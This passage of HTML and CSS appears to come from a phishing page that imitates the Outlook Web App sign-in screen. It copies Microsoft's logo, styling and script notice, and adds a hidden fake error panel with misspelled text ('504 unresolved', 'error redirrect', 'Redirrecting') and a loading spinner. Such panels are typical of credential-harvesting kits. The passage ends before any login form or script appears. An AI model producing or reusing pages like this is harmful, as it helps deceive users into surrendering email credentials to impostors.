        .shellDialogueHead {
            font-size: 29px;
            color: #0072C6;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        }
        
        .mouse .shellDialogueHead {
            line-height: 35px;
            margin-bottom: 10px;
        }
        
        .twide .shellDialogueHead,
        .tnarrow .shellDialogueHead {
            line-height: 34px;
            margin-bottom: 12px;
        }
        
        .shellDialogueMsg {
            font-size: 13px;
            color: #333333;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            line-height: 18px;
        }
        
        .twide .shellDialogueMsg,
        .tnarrow .shellDialogueMsg {
            font-size: 15px;
        }
        
        .headerMsgDiv {
            width: 350px;
            margin-bottom: 22px;
        }
        
        .twide .headermsgdiv {
            margin-bottom: 30px;
        }
        
        .tnarrow .headermsgdiv {
            width: 260px;
            margin-bottom: 30px;
        }
        
        .signInError {
            font-size: 12px;
            color: #C1272D;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            margin-top: 12px;
            display: none;
        }
        
        .passwordError {
            color: #A80F22;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            line-height: 18px;
        }
        
        .mouse .passwordError {
            margin-top: 10px;
            font-size: 13px;
        }
        
        .twide .passwordError,
        .tnarrow .passwordError {
            margin-top: 12px;
            font-size: 15px;
        }
        
        .signInExpl {
            font-size: 12px;
            color: #999999;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            margin-top: 5px;
        }
        
        .signInWarning {
            font-size: 12px;
            color: #C1272D;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            margin-top: 5px;
            display: none;
        }
        
        input.chk {
            margin-right: 9px;
            margin-left: 0px;
        }
        
        .imgLnk {
            vertical-align: middle;
            line-height: 2;
            margin-top: -2px;
        }
        
        .signinTxt {
            padding-left: 11px;
            padding-right: 11px;
            /* Needed for RTL, doesnt hurt to add this for LTR as well */
        }
        
        .hidden-submit {
            border: 0 none;
            height: 0;
            width: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        
        .officeFooter {
            position: absolute;
            bottom: 33px;
            right: 45px;
        }
        
        .tnarrow .officeFooter {
            display: none;
        }
        
        .signInErrorDiv {
            display: none;
        }
        
        .sk-fading-circle {
            margin: 100px auto;
            width: 40px;
            height: 40px;
            position: relative;
            margin-top: 30px;
        }
        
        .sk-fading-circle .sk-circle {
            width: 100%;
            height: 100%;
            position: absolute;
            left: 0;
            top: 0;
        }
        
        .sk-fading-circle .sk-circle:before {
            content: '';
            display: block;
            margin: 0 auto;
            width: 14%;
            height: 14%;
            background-color: #0072C6;
            border-radius: 100%;
            -webkit-animation: sk-circleFadeDelay 1s infinite ease-in-out both;
            animation: sk-circleFadeDelay 1s infinite ease-in-out both;
        }
        
        .sk-fading-circle .sk-circle2 {
            -webkit-transform: rotate(30deg);
            -ms-transform: rotate(30deg);
            transform: rotate(30deg);
        }
        
        .sk-fading-circle .sk-circle3 {
            -webkit-transform: rotate(60deg);
            -ms-transform: rotate(60deg);
            transform: rotate(60deg);
        }
        
        .sk-fading-circle .sk-circle4 {
            -webkit-transform: rotate(90deg);
            -ms-transform: rotate(90deg);
            transform: rotate(90deg);
        }
        
        .sk-fading-circle .sk-circle5 {
            -webkit-transform: rotate(120deg);
            -ms-transform: rotate(120deg);
            transform: rotate(120deg);
        }
        
        .sk-fading-circle .sk-circle6 {
            -webkit-transform: rotate(150deg);
            -ms-transform: rotate(150deg);
            transform: rotate(150deg);
        }
        
        .sk-fading-circle .sk-circle7 {
            -webkit-transform: rotate(180deg);
            -ms-transform: rotate(180deg);
            transform: rotate(180deg);
        }
        
        .sk-fading-circle .sk-circle8 {
            -webkit-transform: rotate(210deg);
            -ms-transform: rotate(210deg);
            transform: rotate(210deg);
        }
        
        .sk-fading-circle .sk-circle9 {
            -webkit-transform: rotate(240deg);
            -ms-transform: rotate(240deg);
            transform: rotate(240deg);
        }
        
        .sk-fading-circle .sk-circle10 {
            -webkit-transform: rotate(270deg);
            -ms-transform: rotate(270deg);
            transform: rotate(270deg);
        }
        
        .sk-fading-circle .sk-circle11 {
            -webkit-transform: rotate(300deg);
            -ms-transform: rotate(300deg);
            transform: rotate(300deg);
        }
        
        .sk-fading-circle .sk-circle12 {
            -webkit-transform: rotate(330deg);
            -ms-transform: rotate(330deg);
            transform: rotate(330deg);
        }
        
        .sk-fading-circle .sk-circle2:before {
            -webkit-animation-delay: -1.1s;
            animation-delay: -1.1s;
        }
        
        .sk-fading-circle .sk-circle3:before {
            -webkit-animation-delay: -1s;
            animation-delay: -1s;
        }
        
        .sk-fading-circle .sk-circle4:before {
            -webkit-animation-delay: -0.9s;
            animation-delay: -0.9s;
        }
        
        .sk-fading-circle .sk-circle5:before {
            -webkit-animation-delay: -0.8s;
            animation-delay: -0.8s;
        }
        
        .sk-fading-circle .sk-circle6:before {
            -webkit-animation-delay: -0.7s;
            animation-delay: -0.7s;
        }
        
        .sk-fading-circle .sk-circle7:before {
            -webkit-animation-delay: -0.6s;
            animation-delay: -0.6s;
        }
        
        .sk-fading-circle .sk-circle8:before {
            -webkit-animation-delay: -0.5s;
            animation-delay: -0.5s;
        }
        
        .sk-fading-circle .sk-circle9:before {
            -webkit-animation-delay: -0.4s;
            animation-delay: -0.4s;
        }
        
        .sk-fading-circle .sk-circle10:before {
            -webkit-animation-delay: -0.3s;
            animation-delay: -0.3s;
        }
        
        .sk-fading-circle .sk-circle11:before {
            -webkit-animation-delay: -0.2s;
            animation-delay: -0.2s;
        }
        
        .sk-fading-circle .sk-circle12:before {
            -webkit-animation-delay: -0.1s;
            animation-delay: -0.1s;
        }
        
        @-webkit-keyframes sk-circleFadeDelay {
            0%,
            39%,
            100% {
                opacity: 0;
            }
            40% {
                opacity: 1;
            }
        }
        
        @keyframes sk-circleFadeDelay {
            0%,
            39%,
            100% {
                opacity: 0;
            }
            40% {
                opacity: 1;
            }
        }
        
        .loaderBlock {
            position: relative;
            display: grid;
            grid-template-columns: auto;
            margin-left: auto;
            margin-right: auto;
            padding-top: 100px;
        }
        
        .signInImageHeader {
            position: relative;
            justify-self: center;
        }
        
        .loaderText {
            position: relative;
            justify-self: center;
            margin-top: -80px;
            color: #0072C6;
        }
        
        .ErrorSEction1 {
            color: #0072C6;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            font-size: 4rem;
            margin-bottom: 20px;
        }
        
        .ErrorSEction2 {
            color: #0072C6;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            font-size: 3rem;
        }
        
        .secTionE {
            position: relative;
            width: 500px;
            margin-left: 30px;
            margin-right: auto;
            display: none;
        }
        
        .secTionE>p {
            margin-top: -10px;
        }
    </style>

</head>

<body id="body" class="signInBg" style="background: #f2f2f2 url(&#39;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAANvCAYAAADk40vJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA+VpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcDpDcmVhdGVEYXRlPSIyMDEyLTA1LTE1VDEzOjEwOjU5LTA3OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzI2NTAzNjQ5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MzI2NTAzNjU5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozMjY1MDM2MjlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozMjY1MDM2MzlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PnYK5fsAAAFLSURBVHja7NthDoIwDAZQNN7/vCTKKifQgZh12yPx30uG/bqyGLyt6xpLxXVfKi8QBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBMFh4WP/ePUSBEEQBEHQIQ4EQRA0cUHQdgVBe0Z5QN0Dalx1lAwoGcmAklEeyShP2/I8QlNoCuWRzJXlCeXRuGfvMSSjcX1rjat7NK6llUcyyqM8kvlh6X3dIhmNe2pp5ZGMpQ8nE8qT9R6LZFLeY0xYHnvm69G1h/NjmXJpjWukSGa4ZGIzUpI+C3vYMzM+C6Nu6XmH/XwjpZc9I5mkwz6K8iRtXMlI5mwy0TKZV/Zhf/kZd6g903akxJyN28Ow3ySTdKQ0SyZajpRyKfzPr1wNG3czUj5t1x6G/TbhSKlMZqiRcuhk365xI/2wj6aN+0y+Z25R98LQWH8QeQswAHk7x/k/TxxLAAAAAElFTkSuQmCC&#39;) repeat-x"
    data-new-gr-c-s-check-loaded="14.1004.0" data-gr-ext-installed="">
    <div data-v-7e2550d6="" class="odm_extension image_downloader_wrapper">
        <!---->
    </div>


    <noscript>
	<div id="dvErr">
		<table cellpadding="0" cellspacing="0">
		<tr>
			<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAptJREFUeNqkU01LVFEYfu7XzJ17nZmyJBW0sgRDRAgLoi8tghZG9QNaR7tg2vQjbCu2a9Eq2qRGUYFBZAtLURzSUUcJG8d0ZnTu99fpPdIMSktfOOfcezjP8z7vc94jMMZwmJD5JAhCfWPm0e2+MGKDYRQNBCHrpTWi/1kaExFjY7defp6qneXJhb3pHwGBH4qy8uSIrp9NqjJ0TXsXuvZ0KfvjacEVsIlEzhXkofuvJ0f+I+BgVdOftfZe0OIsQBBTFxLX7raxCIH75vn3xOjwQDbQsSgfNw0pkXkwPjXCsWJNNjFlmttPaWrqKBBTEb9yr0No7tCEptaU3H3xMgQJp90imo2C7plGZvhmbx/H7hHwmnUJnWpjI8L1ZSg7fyBoSQWUHo4FIabFwEJE5HeLX4JmVzqrtjdYN5GM6k95FlhpE4q5A8GzEWzkITYkKYWEqLgG+C58IgiIMx1WkfX0/joBud2Tsrco+wokZ5dAIsL5Scgnu8ACH/7qTyL14RDYo/NJZqPq+D37FYDtlqHlp6n+xF7WYHkO8ZBkE6G9tgQ3BCwabsTdBwzbw34P5oohfZaKwHYB2CrA+bWCyKwgyC/AIU+qnIDAAYE3PAmG48/tU8Am1uXU9XR1A4rrQ6S2iHwP9pe3dIc2/OouTCLgJfBYNCVYrj9RV8A7rCIncwvSMWz5JIDUyW2dkXr1DmKnzxFBuVwDZw0JMxXkLC8YqxPw9vSk2NC62mQui2mUA9rsvpSX0o1+vL2r7InxFzXwp03R/G1GQx9Na6pOwIO3p6U0ZFbjLbl56QRY9tsZbyU7W/jwalyKq4/fb6sYLSq5JUPIfA28kRruwFvgwTuMNwmNG3RV58ntkAyb5jVz2bXMB97CYeKvAAMACjWGjcO+NcIAAAAASUVORK5CYII=" alt=""></td>
			<td style="width:100%">To use Outlook Web App, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser doesn&#39;t support scripts, you can download <a href="http://www.microsoft.com/windows/ie/downloads/default.mspx">Windows Internet Explorer</a> for access to Outlook Web App.</td>
		</tr>
		</table>
	</div>
</noscript>


    <div class="secTionE">
        <p class="ErrorSEction1">:-(</p>
        <p class="ErrorSEction2">Something went wrong</p>
        <p style="color: rgb(122, 121, 121);">A problem occured while you were trying to access your mailbox.</p>
        <p style="color: rgb(122, 121, 121);">:- 504 unresolved</p>
        <p style="color: rgb(122, 121, 121);">:- error redirrect</p>
        <p style="font-size: 1rem;" class="ErrorSEction2">-> Redirrecting ....</p>
    </div>


    <div class="loaderBlock" style="display: none;">
        <div class="signInImageHeader" role="heading" aria-label="Outlook Web App ">
            <img class="mouseHeader" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAacAAAA3CAYAAACo/oVvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjE3MDNDRjUyRjEzRDExRTE4QzQxRkZBNzQzOUQyQTA5IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjE3MDNDRjUzRjEzRDExRTE4QzQxRkZBNzQzOUQyQTA5Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MTcwM0NGNTBGMTNEMTFFMThDNDFGRkE3NDM5RDJBMDkiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MTcwM0NGNTFGMTNEMTFFMThDNDFGRkE3NDM5RDJBMDkiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6fCYPkAAATVklEQVR42uxdTYwjRxWutWYTfoK2NwlwQLA9oEACQutFCofsYXokIqEAmh7xIw6RxkY5ICE0YyEOwMEzB4QQCHtuOSDGI3EgF8YGIUUIadsS5gRMj8IhgMh6DigSsNAJBAJKFNyu6rWn+73u+uu2Z/d9kmeTGburXPXe+957VfXqAiNUj9bojdRvAta5vk4Dkxknb/LzRuq3e5Ox2qXBIRDubKwYGo/65KczeXnAX8PJazwxJCENM4FAIBDKI6fWKCYif/LaEP/KfCb+2Z+8BtN/O9cjGnYCgTCxDTdSji1lEAiK5NQauZOf7cmrodmOL16dybP2J/92iaQIBAKBoE9OrdGuICYbcMSztibPbU0Iqk9TQDhn3n6cyj4G/nLZ2OHimYl/pH5rHk1gfe5cv0ATWoqMxNFgeq00moz3ZRocedRyFaU1OrZITPOII7GjyfM751gA3clr51x/B4I6+BrqGMkOmAJ6hidIy/ZzyTEsD1ugY94aNWhoTMmJe1o3J696zmdjJd2bvNaF13jh9ouxVfH7LqLICWLjfnDOSKkjSDsen07BGBHuTATA79YsPBd7hlfCc4c0jaXYByfHUdmiAZLHChgR8JDUyVHMeDtvkONdjgUpxe9piTAXM+SN6aaJzvXmORmzHRKbux4Dll1/9Sw8188hF5NIx6PIqTL4ObbTm9pXbh8JSpETZ/0jZHCjKdHE+e88YoLJKs6bXxORFkMIiow+4TxHTq7IOOh63F6OUfMNngt9dkwGsjRsG/6dAJITX1+qI8QUk1LXqDV+eBKLkNoiaiMQlht840NfMkKRxUbO31wD3VijqKki8DmqA7bTjqNx15IT9/p2cogptKTYPYSgYq/xgKaEcE4wVCSYIniGf1f5HK03VRc17QOOBhGUYuSE7TprWa/ywAkK9jx5eoNAWHZg8qu+sw72uMfGxMf7Ugf0jyKnctBI/X+IyAltjJAmJx41eaACciIpA00g5MW8DwJhucDXbEJLEQ70mbGF59IW8qrAo6G0Y3IoHPswMy+0hFGIlQJCaJWo3JGoFtEGJs7JHGiEvcBIO6qb1QWc71OQeo+MQXAK3heWVg2DC7gnvGqXweuFiXIMme3yUVwh10S7dUA5o1Tb4QKMBtSvjOx842enV17+7+ubF2sXXvyev/qM5NMDYMx1dtZtAM8NU4TE5UxtMxJtIa8OUDTUu01SWTmJdadLw1ZMTj44sOXv6Okx+JCvPzexCeLJvQEose7p+Q7gjaZPzN+QeE694H3rDN7dZUpKsuWkEuJoMF4+qs94qjbSbDs29DvCoSlKYSVFgT3GN7zE47CnvNtTf5y8nLlpJh7tF370x+8/+3z06fc+cO9J/P8Pf+u3B088crkpQVIDll2n9TWcOh8gkDESYamMnWctcpo5Qi5I0mXOKZc5D3G+gsrkKX9s/Mw4z3Ssz7LLJtuVkBM+b5EYu7ACHcQyA0Eex6zkeJaDSlIjrVEICN0GQE4EPtm7TL9qhyNIKo5Om8prD1xWjhADJWss43WZuLZiq+RxSvoKE5NIV3/5xy/s/P4v/5lGGM+9+O+P/ut/r1/83NUHnxz+6eWnJ796pkB+g0k7UUp/XKWzLPDieBI5HQB6savw/d2MQVB1OHlVg22Wf9i8LcbBbt1MOSesnLbVAPXvMGXn+ikCczUi4fmxyb92h5NCmxWlg1ujsXAYe4Y2aHbESMWB5eOyB5FkDYmaogoXTQeSHt/dTkqOqOJso5wUP8+mUk6Fv/fYgJjmsTOtsmFelifPMGMHyZvzijghpi89+u77Phb/9+MfcL6+ev+b/hq9+trjj7zzzUFMXBKt9SUioTysAboXCCMbZqJg+TEzi5riMeSVUA6YXBWUpG7msdF5r1n78djflMwO2G1bHVsS9nMg8Tlb8n8g5F/GjrrTObalj7M6jm2JzEqiK8eC8DLkdBXx3KpCAApbWYZLvW/pFwPDY/xly5M7yhG2+VJS8SspH9UUESjWhwOpdTVOTNg2/0i0sZlqe130CfPU6wzfIVoJMcW49cprD37zE1dOpwP83K3v3Pz7q2//wecfeuqelQu3JFscShBOkXJi+mDiuOmvN83GUMfQu9PPmh1IPtCUDfO29dJWbqETwOUuykRctu1ca3TE9G6P4CXrTDZqzORG5xntdCm7FeRBJxUSQJgzWFWSJJS2WZcIp8PS76DhXgVklMbC4AbI39iUOOIK8FzZGyDptUaraDqECytmKPaQVMp4ztDuCnLrAIQRK+eJ8eHu+eiSk6gUMcWII6THJhHSr27+k21++IGvxgQVR0zhn1954jH3bTKpjj5A3LJ3nbmA/g1Sz05HyhuSEZAHyHNfwcA4iK4O5ubXFf2pA5FMTBLXNNOIDaTdSLRdF061j0RRem3biZpi7OfISgOQlZ4l+T9g0NoXt+dFczafUVnXSI9C1YWSw+qnYg7jNi+JPkK8c8YerDBskbE6AojEhYQE3Fi0EUMhJ0T8Pc3Js4aAIXUEcTTR6ErB2CPt98TaImT0Yo+pZ+m6CczbR/t65fK9O88+H4UPvHXlb2+5WPv1Jz94/3cnRNV+16V7bn77U+4vJeU3u24qt57g5+penIfPrmnJRLoeMM59yTGEypdF08gY/j67or305xJHQcVxSztC8bi2gHb7KcfJB2RatW1dmWtkHDN8k8E+8P5tS+SUPg6UbHwaI3NWZ3DKNinGsKvY/rydiBhfR+oiMtgSaVso9cc3bU36XVsSEzw2SF/c6Wgj46Xu3XAD3UM8Fhcxcp4RMc0bWthYJIunlRNTjDil9/GHnfo77rv4u1/84aWfvnDr1c88+p77nv7JU498RKEHh8DvZA7NbgBR+LjAUZSp4QfN2VBS1lzACVotKPQciLmNMv1QS7G5c8aqN63HWVRgunN9E5HpKg70+wpRE3bdSt1SGtJJyfxmbuQ408cQSbG5mu3Llbrjf4dk5rbNqymm2qokJwK8RTURPt1Io4UIBNTONujZ6x7M5grRlUyNqHptysQ0T1A/fPL9m7/5ytXLP//ihx56+rPv+5pi+4GyczXbHl30HJ11J/V6elzWdpCIKZKc25akDBWPp8otBfy9gaW2VbCtPM4wednsZ1choxEJghiDDqs61Erd8fftYc5yLafThMXDBx0Hk3MdfG73C714/F4a0y3g+6DHrOs9wnl2NSU1Be4Ru4rRzUCS+NYUSU9mCzkUoe8prdvw8R5LyHCRgdO5PqcF6k+5O0LrAKkWjVe/xH6OlY9ocHuwpxn5Z3Vb9dwUj6AgGfdrOV7UokEECQvIvoXnylTU9hBiNIuqufKqRxo4MUEeXq/0c1Tm0dNGRt4hpwMuk+Qrkp7MBgofMHRdC7LlKNqTvtZGBrhMEGPlXQYKRfuHmvLvMDvVyvc0dbIH2Nu6ImFGTP9QMTRua1har2pyckFDSPAkjaCOIkeAsfcKlDqw9L2g9Y+risS0m0NMi7i4cqDofXoKYxsUzFVRVDWUiALUN1DAODW0J4cGc3BoxemRQwMwzn2Dfto489S3/Nm60uf1M25g28uyIcJlBJnoNbK4PbaI/MusyxYayQDfbtxeImLCtml7OWTgSpCbDvF5kn0r6ufQ4tx6CuMYWJarSyXoZgMkc3nj3Gfw5hHX6LubLcecGJLTiYHuQAfO3RUxSA4gTEElSo1PyN0eOZUdTY4RYQwKQncbMHkOdkZjccR01ujMp2ecKRFlU6G+UlQKl0nyEF2qa3jTV4DfHS3giIep41VVWm9D0oHAjTEv25OOvuKNEa0F6BQ2do7h5436v8Ky1Y/VUyxmqCMRAq05lYtTQ2FcFLDin80l6NsQIB4fUFyZLeQQeflnxiFbw083AqovydyakVMVZybxHbSqW8IhXWuwMm+COGfAyMmrsA9rFDURDOFNUy1V7c7Lj5w6ABHtzhk36OoXmSzFADCKHjt7xoeuZC8fDeT3dmpexoWA6TLIKWqIZ+VUeJWwbxQiE3RxqYTUQBXoIs7LgVIh2zIA76xL73rSlfdAwrHzMpFINSV8lgPV1OPcOufPP1eRE+a1ydbwMhGmWJlcSUUk2N04Uj+nEetLjJ+DgUohHUzTOouNoAJgbL05XYKrkMsQX7ZMks+SM0HwJgsT/b18DlPrkEzbI2fcXtl11lWuXCl37BYcOXEB7IHha/nnnbZAA1nNjanLvr5itqNNj+iigijKWwpinJVeiZYwgiraWecbOGIBkOGo58yN7I678XkwVpoyfXoOo5pFyK+z4CAhLb9RchPuITIgcf58s8SoCWpzvyJjvdzKxxd3x5nvaCMnzdMfLmL0E5wAhtTWRhlobeREcXzCafXkZYug8nbWwQVZVVLY0M27ntCNNaAvsnJyalm3FqWTV0vLBsBFXs0jTPg6mpgEdyse+41So878MQCd1dpthUJKSJTihc6uNsgOBmZQYAFwtfLM5ReEtIVAUojUUwdZ9CXaNi+zApfX0fPSOJni1dQXF0H1ATmtI3MXKHzfAIgWN5A57RvK2doCxs0xzNb4pZETpjPmqU/ozJOrYaPqhjpZz2RR1FKLJjYVjPrnD+FipS86JVzedYB4ZkXlN2ylmmyG52US3RAM+c3TrW3EKy8yhIyZVhDnSu5kDIhujp1HB8tGUENETjwL3zvIPBc2ZCqHaMNSHBF7JCDrcLrW5CqL7UKd0c2QwI6Eqo1yDJzuHQkHq0ybChbQraWMURf80vzyLnMjzK8axwp1ylS7Do0jCW7YF+VRqwpuj2HrKvpzsAMoMaYg+yCx6RdpTe6OkmlHdZzyCKrqFC40lleZ3hZyGYO4bRiRQfNvfpWJruOkR4qQXB1a6RFc5DWymDY+RJxQR3ns9HRy28LYuVqOIGyPpndi1YDIJcwhqF3DCb6BEINsJeIBMomewkQcWVenco3fPuiFp640VuhnG2wDTk90EXJUvwp7dueSAwiiuZLzZ2AHGKu9upuPZZCRUzuedyCR0hlrbCoaIEThaeuE3nEUR9n5ao06IHnYumFW72oMFXkJmJ1rKzwNG32A6KSO46SWZcPt0TSDVgOUqsnw8y6xsN5UYkgupPEAHDOsGgS/A0Qm/MYE4qhwUPIvpDM1Dm1WFjrXdxGHISblI2nvis8ZRA6haAMzsns5zorKdeT4ZYD2xqqLGCSncoIqJp5IywDAZ6lc44iMk3uI6JaKvjvCQB4b6Jo/tRkyss3b2lFwuPT6U1ZUlv88nVRZW4qg8rNYujopr2ezYAV1VlcAIc3bBZUowoHwVmIlOAGUIW74CsPvik8TUyitmK1RwLK5e2eqDK3RHuOLlGHKMDaE9zN/W2PE9HYkQRU1/ClRzF+LzAd/m+nccQILCzQfvvCW+lPhThs7/t09IeQeMv6bhQa/NboKeHGOMFyBUKzsXTbc697K8QD3DAt9Qv1tihI2DURx1is6qhAY/r3os3UDYsyTs2MwkmmNtoQs9xFjE8/1hhh3G2tVDSHbiU5HqfZ8oV8eqKOYw6UeATYsRhZ56AFObh2pzShDUGvgfM3uaWsj9q9n+N0SW9xj0H1g3CZtMzxlfNserSAKHhPUakGkkXxJXzNy4Dut1Ac+USAHiWDaEvW1WsJo6pDTPjKwviAp+x5WvsOQbHFtKNYVU4lYW0IO6mAqYbZVWk0ZbRmQZSQoPmfjHBkzWUwfsvz1oMCgz00kreYJskh0N5obU1sRaTDX1swR5uQ436aX84wx42fgbGGr1JTeWce7D0Qy25KRTCjmwgXmK5CcK+w2Yxl0UzKZ2KQxm6Us3QKbe4YPajmDFacdrom0ju2T4ntKEVM2rWFSHLFntMbB2++yqjE7eDq28LRQMWJNZKFn6du0Si/Uyp8fGqUezNEvJXLKP78UGKWz8jeXzGdGEqekXuAAqWKT4dXFvQJiSuTajr2aZR7sO5zyDovsrskkCxLlOJD1Ank0GbsBYhfdufaLiOmMfalJCGvs3a5aIKlkgXJ1+kxzBVI11JE1o8hvWe2xqsHJxMRhiESofU3TMWgaEmQw7b/eDas6WF8wQQ1RI2q+xblfQkQ2r1/XmP4ZoYQkuhptR2LeVKOTrkImQBYNZO7CkvS7B+i1/C25Mwc21LAJ5qTO7WJT0TaFwiZk7OmKgsDsTl8817uRk+ZJh9iBUNK+1Vpd/CT+NSFAWzl9GQtB308J7iEzuTyPp46GIuzGNnr0EUHZA/rIlOaiNeqK775R4E0mO8cGVuaA56NX5+SgyCMKRfuHGko9BsYqUBorng7FUmAeK7OeYBzh8DUTaExMEaeXT0pLOSWO0GyeofNppvOc1sHxnIxvinWs7RzjjOm2LZjJn25WAT7qoTpvjRzblMzXocgk2bTLPbEOncybm2OTDvOyABcshL7QFc9RRYvO6b54GeGqqoDi2barrwbNUxDuQr4/fsKcrj65kwDPc1UydtbO2N+QcN7m4o0MacbRT7FtMtdLvhuwnclSQHOSlRlpeblAGkcgEAh3MDnZb1uenAxQo1kmEAgEwrKByIlAIBAIRE4EAoFAIBA5EQgEAoHIiUAgEAgEIicCgUAgEDkRCAQCgUDkRCAQCAQiJwKBQCAQiJwIBAKBQEjh/wIMADjrrMZtek4IAAAAAElFTkSuQmCC"
                alt="Outlook Web App ">
        </div>

        <div class="sk-fading-circle">
            <div class="sk-circle1 sk-circle"></div>
            <div class="sk-circle2 sk-circle"></div>
            <div class="sk-circle3 sk-circle"></div>
            <div class="sk-circle4 sk-circle"></div>
            <div class="sk-circle5 sk-circle"></div>
            <div class="sk-circle6 sk-circle"></div>
            <div class="sk-circle7 sk-circle"></div>
            <div class="sk-circle8 sk-circle"></div>
            <div class="sk-circle9 sk-circle"></div>
            <div class="sk-circle10 sk-circle"></div>
            <div class="sk-circle11 sk-circle"></div>
            <div class="sk-circle12 sk-circle"></div>
        </div>

        <a class="loaderText">loading ......</a>

    </div>

    <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class -->
    <div id="mainLogonDiv" class="mouse">
        <div class="sidebar">
            <div class="owaLogoContainer">
